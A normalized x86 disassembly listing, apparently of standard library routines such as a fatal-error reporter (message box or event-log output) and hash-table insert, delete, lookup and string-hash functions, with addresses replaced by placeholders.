add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1001f5b0
mov ecx [ esp + 0x8 ]
test ecx ecx
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
push edx
push ecx
mov ecx [ esp + 0x10 ]
push ecx
call eax
add esp 0x10
jmp r-xdata
sub_1001f5f0
mov eax [ rw-data ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov edi [ esp + 0x1c ]
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x20 ]
test edi edi
jge r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ecx
call eax
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov esi [ eax ]
add esi ecx
test edi edi
mov [ eax ] esi
jge r-xdata
push ebx
push ebp
push edi
push 0x9
call eax
add esp 0x10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push ebp
push edi
push 0xa
call eax
add esp 0x10
push ebx
push ebp
push edi
push 0xa
call eax
add esp 0x10
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1001f6a0
push ebp
mov ebp esp
mov eax 0x4
call sub_1001d0d0
push ebx
push esi
push edi
call [ GetDesktopWindow@IAT ]
call [ GetProcessWindowStation@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
lea esp [ ebp - 0x10 ]
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x200
ja r-xdata
lea esi [ eax + 0x1 ]
and esi 0xfffffffe
mov [ ebp - 0x4 ] esi
lea eax [ esi + 0x2 ]
add eax 0x3
and al 0xfc
call sub_1001d0d0
lea ecx [ ebp - 0x4 ]
mov edi esp
push ecx
push esi
push edi
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
push r--data
push edi
lea eax [ edx + 0x1 ]
and al 0xfe
mov [ ebp - 0x4 ] eax
shr eax 0x1
mov [ edi + eax * 2 ] 0x0
call wcsstr
add esp 0x8
neg eax
sbb eax eax
neg eax
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001f760
push ebp
mov ebp esp
mov eax 0x104
call sub_1001d0d0
push ebx
push esi
push edi
push 0xfffffff4
call [ GetStdHandle@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
push edx
push eax
lea ecx [ ebp - 0x104 ]
push 0xff
push ecx
call _vsnprintf
add esp 0x10
mov [ ebp - 0x5 ] 0x0
call [ GetVersion@IAT ]
cmp eax 0x80000000
jae r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x10
lea ecx [ ebp - 0x104 ]
push r--data
push ecx
push 0x0
call [ MessageBoxA@IAT ]
lea esp [ ebp - 0x110 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetDesktopWindow@IAT ]
call [ GetProcessWindowStation@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push _itoa@IAT
call vfprintf
add esp 0xc
lea esp [ ebp - 0x110 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push r--data
push 0x0
call [ RegisterEventSourceA@IAT ]
mov esi eax
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x104 ]
push 0x1
push esi
mov [ ebp - 0x4 ] edx
call [ ReportEventA@IAT ]
push esi
call [ DeregisterEventSource@IAT ]
lea esp [ ebp - 0x110 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push 0x0
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x200
ja r-xdata
lea esi [ eax + 0x1 ]
and esi 0xfffffffe
mov [ ebp - 0x4 ] esi
lea eax [ esi + 0x2 ]
add eax 0x3
and al 0xfc
call sub_1001d0d0
lea eax [ ebp - 0x4 ]
mov edi esp
push eax
push esi
push edi
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
push r--data
push edi
lea eax [ ecx + 0x1 ]
and al 0xfe
mov [ ebp - 0x4 ] eax
shr eax 0x1
mov [ edi + eax * 2 ] 0x0
call wcsstr
add esp 0x8
test eax eax
je r-xdata
sub_1001f900
push esi
push edi
push 0x5a
push r--data
push 0x20
call sub_1001d4c0
mov esi eax
mov ecx 0x8
xor eax eax
mov edi esi
[ edi ]
xor edi edi
add esp 0xc
cmp esi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
mov [ esi ] edi
cmp eax edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] 0xffffffff
je r-xdata
push sub_10030910
push eax
call sub_1001e730
add esp 0x8
mov [ esi + 0x1c ] edi
sub_1001f960
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push esi
call sub_1001d740
add esp 0x4
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
mov [ esi ] edi
cmp eax edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] 0xffffffff
je r-xdata
push sub_10030910
push eax
call sub_1001e730
add esp 0x8
mov [ esi + 0x1c ] edi
sub_1001f9b0
mov eax [ esp + 0x8 ]
push ebx
xor ebx ebx
push ebp
push esi
cmp eax ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov esi [ esp + 0x14 ]
mov edx [ eax + 0x8 ]
or edx [ esi + 0x8 ]
test dl 0x10
je r-xdata
test dl 0x8
jne r-xdata
mov [ esi + 0x8 ] ebx
mov edi edx
and edi 0xff
and edi 0x1
test dl 0x2
je r-xdata
mov ebp [ eax + 0x10 ]
xor ecx ecx
cmp ebp ebx
je r-xdata
mov ecx 0x1
jmp r-xdata
cmp [ eax + 0x14 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ eax + 0x10 ]
cmp ecx ebx
mov [ esi + 0x10 ] ebp
jne r-xdata
or ebp 0xffffffff
cmp [ eax + 0x18 ] ebp
je r-xdata
cmp edi ebx
jne r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
mov ebp [ eax + 0x14 ]
cmp ecx ebx
mov [ esi + 0x14 ] ebp
jne r-xdata
test [ esi + 0xc ] 0x2
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ esi + 0x14 ] ebx
jne r-xdata
mov ebp [ eax + 0x18 ]
cmp ecx ebx
mov [ esi + 0x18 ] ebp
jne r-xdata
test dl 0x4
je r-xdata
mov ebp [ eax + 0x4 ]
mov [ esi + 0x4 ] ebp
mov ebp [ esi + 0xc ]
and ebp 0xfffffffd
mov [ esi + 0xc ] ebp
cmp [ esi + 0x18 ] ebp
jne r-xdata
mov edx [ eax + 0xc ]
mov ebp [ esi + 0xc ]
or ebp edx
cmp ecx ebx
mov [ esi + 0xc ] ebp
jne r-xdata
mov [ esi + 0xc ] ebx
mov ebp [ eax + 0x1c ]
cmp esi ebx
je r-xdata
cmp [ eax + 0x1c ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi + 0x1c ]
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
cmp ebp ebx
jne r-xdata
push sub_10030910
push eax
call sub_1001e730
add esp 0x8
cmp [ esi + 0x1c ] ebx
jne r-xdata
call sub_1001e3c0
cmp eax ebx
mov [ esi + 0x1c ] eax
je r-xdata
mov [ esi + 0x1c ] ebx
push ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esi + 0xc ]
pop edi
or al 0x80
mov [ esi + 0xc ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push ebx
push ebp
call sub_1001e7c0
push eax
call sub_10030980
mov edi eax
add esp 0xc
test edi edi
je r-xdata
mov eax [ esi + 0x1c ]
push edi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push edi
call sub_10030910
add esp 0x4
push ebp
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
sub_1001fb20
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x24 ]
mov [ esp ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push sub_1001fb90
push 0x20
push 0x5
lea eax [ esp + 0xc ]
push r--data
push eax
call sub_10023340
add esp 0x14
add esp 0x20
retn
lea ecx [ esp ]
push ecx
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov edx [ rw-data ]
push eax
push edx
call sub_1001e7c0
add esp 0x8
add esp 0x20
retn
sub_1001fb90
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebx
push esi
mov esi [ eax ]
mov eax [ ecx ]
sbb eax eax
pop esi
sbb eax 0xffffffff
pop ebx
retn
test cl cl
je r-xdata
pop esi
xor eax eax
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_1001fbd0
push esi
push edi
push 0x77
push r--data
push 0x60
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
push 0x79
push r--data
push 0x40
call sub_1001d4c0
add esp 0xc
cmp eax edi
mov [ esi ] eax
jne r-xdata
xor eax eax
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esi ]
add eax 0x4
cmp eax 0x40
mov [ ecx + eax - 0x4 ] edi
jl r-xdata
mov eax [ esp + 0x10 ]
cmp eax edi
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ esp + 0xc ]
cmp eax edi
jne r-xdata
mov eax strcmp
mov [ esi + 0x8 ] eax
mov eax 0x8
mov [ esi + 0xc ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] eax
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x10 ] 0x10
mov [ esi + 0x1c ] 0x200
mov [ esi + 0x20 ] 0x100
mov eax esi
pop edi
pop esi
retn
mov eax sub_100200c0
sub_1001fca0
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ ebx + 0xc ]
push edi
xor edi edi
test eax eax
jbe r-xdata
mov ecx [ ebx ]
push ecx
call sub_1001d740
push ebx
call sub_1001d740
add esp 0x8
pop edi
push esi
mov eax [ ebx + 0xc ]
inc edi
cmp edi eax
jb r-xdata
mov esi [ eax + 0x4 ]
push eax
call sub_1001d740
add esp 0x4
mov eax esi
test esi esi
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
pop esi
sub_1001fcf0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
xor edx edx
push edi
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0xc ]
shl eax 0x8
div ecx
mov edx [ esi + 0x1c ]
mov [ esi + 0x5c ] 0x0
cmp edx eax
ja r-xdata
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push esi
call sub_10020040
mov edi eax
add esp 0xc
mov ecx [ edi ]
test ecx ecx
jne r-xdata
mov ebx [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
inc ecx
inc edi
mov [ esi + 0xc ] ecx
mov ecx [ esi + 0x18 ]
lea eax [ ebx + 0x1 ]
add ecx ebx
mov [ esi + 0x14 ] eax
mov eax [ esi ]
mov [ esi + 0x28 ] edi
mov [ eax + ecx * 4 ] 0x0
mov edx [ esi + 0x10 ]
lea ebp [ eax + ecx * 4 ]
mov ecx [ eax + ebx * 4 ]
lea edi [ eax + ebx * 4 ]
test ecx ecx
mov [ esp + 0x18 ] edx
je r-xdata
mov eax [ ecx ]
mov [ ecx ] ebx
mov ecx [ esi + 0x44 ]
pop edi
inc ecx
mov [ esi + 0x44 ] ecx
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0xc1
push r--data
push 0xc
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
cmp eax ecx
jb r-xdata
mov eax [ ecx + 0x8 ]
xor edx edx
div [ esp + 0x18 ]
cmp edx ebx
je r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] 0x0
mov edx [ esp + 0x10 ]
mov [ eax + 0x8 ] edx
mov [ edi ] eax
mov edx [ esi + 0x40 ]
mov ecx [ esi + 0x24 ]
xor eax eax
inc edx
inc ecx
mov [ esi + 0x40 ] edx
mov [ esi + 0x24 ] ecx
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esi + 0x5c ]
pop edi
inc eax
mov [ esi + 0x5c ] eax
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ebx [ esi + 0x10 ]
mov edx [ esi ]
shl ebx 0x1
push 0x156
push r--data
lea ecx [ ebx * 4 ]
push ecx
push edx
call sub_1001d540
mov edx eax
xor ebp ebp
add esp 0x10
cmp edx ebp
jne r-xdata
lea edi [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
mov [ edi ] eax
mov edx [ ebp ]
mov [ ecx + 0x4 ] edx
mov [ ebp ] ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x5c ]
mov [ esi + 0x14 ] ebp
inc eax
mov [ esi + 0x5c ] eax
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x18 ] eax
mov eax [ esi + 0x2c ]
inc eax
mov [ esi + 0x14 ] ebp
mov [ esi + 0x2c ] eax
mov [ esi ] edx
mov ecx ebx
lea edi [ edx + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
sub_1001fe60
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
mov [ esi + 0x5c ] 0x0
call sub_10020040
mov ecx [ eax ]
add esp 0xc
test ecx ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
push ebx
push edi
mov [ eax ] edx
mov ebx [ ecx ]
push ecx
call sub_1001d740
mov eax [ esi + 0x48 ]
mov edi [ esi + 0x24 ]
mov ecx [ esi + 0xc ]
add esp 0x4
inc eax
dec edi
mov [ esi + 0x48 ] eax
cmp ecx 0x10
mov [ esi + 0x24 ] edi
mov eax edi
jbe r-xdata
mov eax [ esi + 0x4c ]
inc eax
mov [ esi + 0x4c ] eax
xor eax eax
pop esi
retn
mov eax ebx
pop edi
pop ebx
pop esi
retn
shl eax 0x8
xor edx edx
div ecx
cmp [ esi + 0x20 ] eax
jb r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x18 ]
mov ecx [ esi ]
add eax edx
mov edi [ ecx + eax * 4 - 0x4 ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov [ eax ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec eax
mov [ esi + 0x14 ] eax
mov edx [ esi + 0x18 ]
mov eax [ esi ]
push 0x172
push r--data
shl edx 0x2
push edx
push eax
call sub_1001d540
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ ecx ] edi
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx [ esi + 0x34 ]
mov edx [ esi + 0x10 ]
inc ecx
mov [ esi ] eax
mov [ esi + 0x34 ] ecx
mov ecx [ esi + 0x18 ]
shr ecx 0x1
shr edx 0x1
mov [ esi + 0x18 ] ecx
dec ecx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] ecx
jmp r-xdata
mov eax [ esi + 0x5c ]
pop edi
inc eax
mov [ esi + 0x5c ] eax
mov eax ebx
pop ebx
pop esi
retn
mov [ eax + 0x4 ] edi
mov eax ecx
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi ]
mov eax [ esi + 0x30 ]
dec ecx
mov [ esi + 0xc ] ecx
mov ecx [ esi + 0x14 ]
inc eax
lea ecx [ edx + ecx * 4 ]
mov [ esi + 0x30 ] eax
mov eax [ ecx ]
test eax eax
jne r-xdata
sub_1001ff80
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
mov [ esi + 0x5c ] 0x0
call sub_10020040
mov eax [ eax ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esi + 0x50 ]
mov eax [ eax ]
inc ecx
mov [ esi + 0x50 ] ecx
pop esi
retn
mov eax [ esi + 0x54 ]
inc eax
mov [ esi + 0x54 ] eax
xor eax eax
pop esi
retn
sub_1001ffc0
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov ebx [ ebp + 0xc ]
dec ebx
js r-xdata
pop ebp
pop ebx
retn
push esi
push edi
mov edi [ esp + 0x18 ]
dec ebx
jns r-xdata
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
push ecx
call edi
add esp 0x4
mov eax esi
test esi esi
jne r-xdata
mov eax [ ebp ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
sub_10020000
mov eax [ esp + 0x4 ]
push ebp
mov ebp [ eax + 0xc ]
dec ebp
js r-xdata
pop ebp
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x1c ]
dec ebp
jns r-xdata
mov esi [ eax + 0x4 ]
mov eax [ eax ]
push edi
push eax
call ebx
add esp 0x8
mov eax esi
test esi esi
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
mov eax [ edx + ebp * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_10020040
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push eax
call [ esi + 0x8 ]
mov ecx [ esi + 0x38 ]
add esp 0x4
inc ecx
mov ebp eax
mov [ esi + 0x38 ] ecx
mov ecx [ esp + 0x1c ]
xor edx edx
mov [ ecx ] ebp
div [ esi + 0x18 ]
cmp edx [ esi + 0x14 ]
jae r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
mov edi [ ecx + edx * 4 ]
lea ebx [ ecx + edx * 4 ]
test edi edi
je r-xdata
mov eax ebp
xor edx edx
div [ esi + 0x10 ]
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ esi + 0x58 ]
inc ecx
mov [ esi + 0x58 ] ecx
mov eax [ edi + 0x8 ]
cmp eax ebp
jne r-xdata
lea eax [ edi + 0x4 ]
mov ebx eax
mov edi [ eax ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esp + 0x18 ]
inc ecx
push edx
mov [ esi + 0x3c ] ecx
mov eax [ edi ]
push eax
call [ esp + 0x1c ]
add esp 0x8
test eax eax
je r-xdata
sub_100200c0
push esi
push edi
mov edi [ esp + 0xc ]
xor esi esi
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov al [ edi ]
test al al
je r-xdata
push ebx
push ebp
mov ebx 0x100
movsx eax al
or eax ebx
mov ebp esi
mov edx eax
mov ecx eax
shr edx 0x2
and edx 0xf
and ecx 0xf
xor edx ecx
mov ecx 0x20
sub ecx edx
add ebx 0x100
shr ebp cl
mov ecx edx
mov edx eax
imul edx eax
shl esi cl
mov al [ edi + 0x1 ]
or ebp esi
xor ebp edx
inc edi
test al al
mov esi ebp
jne r-xdata
mov eax esi
pop ebp
shr eax 0x10
pop ebx
xor eax esi
pop edi
pop esi
retn
sub_10020250
push esi
push 0x74
push r--data
push 0x10
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x7e
push r--data
push 0x41
push 0xab
push 0xd
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
call sub_1001e3c0
test eax eax
mov [ esi ] eax
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1001dc60
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001e780
add esp 0x4
mov ecx [ esp + 0x8 ]
mov eax 0x1
mov [ esi + 0x4 ] eax
mov [ ecx ] esi
pop esi
retn
sub_100202d0
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_1001dca0
mov ecx [ esi ]
push sub_10020160
push ecx
call sub_1001e730
push esi
call sub_1001d740
add esp 0x10
mov [ edi ] 0x0
sub_10020310
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push ebx
mov eax [ eax ]
push ebp
push esi
push edi
mov [ esp + 0x14 ] eax
mov esi eax
mov eax [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x30 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push r--data
lea eax [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x28 ]
xor ebp ebp
push eax
push ecx
mov [ esp + 0x30 ] ebp
call sub_10030f20
add esp 0x20
cmp eax ebp
mov [ esp + 0x38 ] eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebx [ esp + 0x1c ]
mov edi [ ebx ]
cmp edi ebp
je r-xdata
push 0x74
push r--data
push 0x10
call sub_1001d4c0
mov ebx eax
add esp 0xc
cmp ebx ebp
je r-xdata
cmp ebx ebp
je r-xdata
push 0x7e
push r--data
push 0x41
push 0xab
push 0xd
call sub_1001de60
add esp 0x14
cmp ebx ebp
je r-xdata
call sub_1001e3c0
cmp eax ebp
mov [ ebx ] eax
je r-xdata
mov edx [ edi + 0x8 ]
push edx
call sub_1001dca0
mov eax [ edi ]
push sub_10020160
push eax
call sub_1001e730
push edi
call sub_1001d740
add esp 0x10
mov [ ebx ] ebp
push 0xc8
push r--data
push 0x3a
push 0x9e
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ ebx ]
cmp eax ebp
je r-xdata
call sub_1001dc60
cmp eax ebp
mov [ ebx + 0x8 ] eax
jne r-xdata
push ebx
call sub_1001d740
add esp 0x4
push eax
call sub_1001e780
add esp 0x4
mov [ ebx + 0x4 ] 0x1
mov ecx [ esp + 0x14 ]
mov edx [ ebx + 0x8 ]
sub ecx esi
push ecx
push edx
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
sub ecx esi
mov edi [ eax + 0x4 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1001e780
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov [ ebx + 0x4 ] 0x0
mov eax [ esp + 0x18 ]
mov [ edx ] ebx
mov [ ecx ] eax
mov eax [ esp + 0x3c ]
add esp 0x4
mov ecx [ esp + 0x10 ]
push ebp
push ecx
call sub_1001e7c0
mov esi eax
xor edi edi
push esi
call sub_1001e7b0
add esp 0xc
test eax eax
jle r-xdata
push esi
call sub_1001e780
mov eax [ esp + 0x14 ]
inc ebp
push eax
call sub_1001e7b0
add esp 0x8
cmp ebp eax
jl r-xdata
push edi
push esi
call sub_1001e7c0
mov [ eax + 0x8 ] ebp
mov edx [ ebx ]
push eax
push edx
call sub_1001e6c0
add esp 0x10
test eax eax
je r-xdata
push esi
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
sub_10020500
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ eax ]
xor ebx ebx
push edi
cmp [ esi + 0x4 ] ebx
je r-xdata
mov esi [ esi + 0x8 ]
mov edx [ esp + 0x20 ]
test edx edx
mov eax [ esi ]
je r-xdata
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] ebx
or ebp 0xffffffff
call sub_1001e3c0
cmp eax ebx
mov [ esp + 0x1c ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov esi [ esi + 0x4 ]
mov edi [ edx ]
mov ecx eax
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
add [ edx ] eax
push sub_10020670
push eax
call sub_1001e730
push 0xfb
push r--data
push 0x41
push 0xcb
push 0xd
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esi ]
push ecx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0xffffffff
push 0xffffffff
push r--data
lea eax [ esp + 0x28 ]
push 0x0
push eax
call sub_10032660
mov ecx [ esi + 0x8 ]
mov edi eax
push edi
push ecx
call sub_1001dce0
add esp 0x1c
test eax eax
jne r-xdata
mov edx [ esi ]
push ebx
push edx
call sub_1001e7c0
mov edi eax
add esp 0x8
cmp [ edi + 0x8 ] ebp
je r-xdata
mov edx [ esi + 0x8 ]
push 0xffffffff
push 0xffffffff
lea ecx [ esp + 0x1c ]
mov eax [ edx + 0x4 ]
push r--data
lea edx [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x28 ] eax
call sub_10032660
mov eax [ esp + 0x30 ]
push sub_10020670
push eax
call sub_1001e730
add esp 0x1c
mov [ esi + 0x4 ] 0x0
test edi edi
mov eax edi
jl r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
push edi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov edx [ esi ]
inc ebx
push edx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
push eax
mov eax [ esp + 0x20 ]
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov ebp [ edi + 0x8 ]
sub_100207d0
push esi
push edi
push 0x46
push r--data
push 0x40
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
push ebx
lea ebx [ esi + 0x38 ]
push ebp
mov ebp [ esp + 0x14 ]
push ebx
mov eax 0x1
push esi
push edi
mov [ esi ] ebp
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call sub_1001f420
mov eax [ ebp + 0x1c ]
add esp 0xc
cmp eax edi
je r-xdata
push 0x49
push r--data
push 0x41
push 0x6c
push 0x20
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
pop ebp
pop ebx
mov eax esi
pop edi
pop esi
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
push ebx
push esi
push edi
call sub_1001f490
push esi
call sub_1001d740
add esp 0x10
xor esi esi
sub_10020880
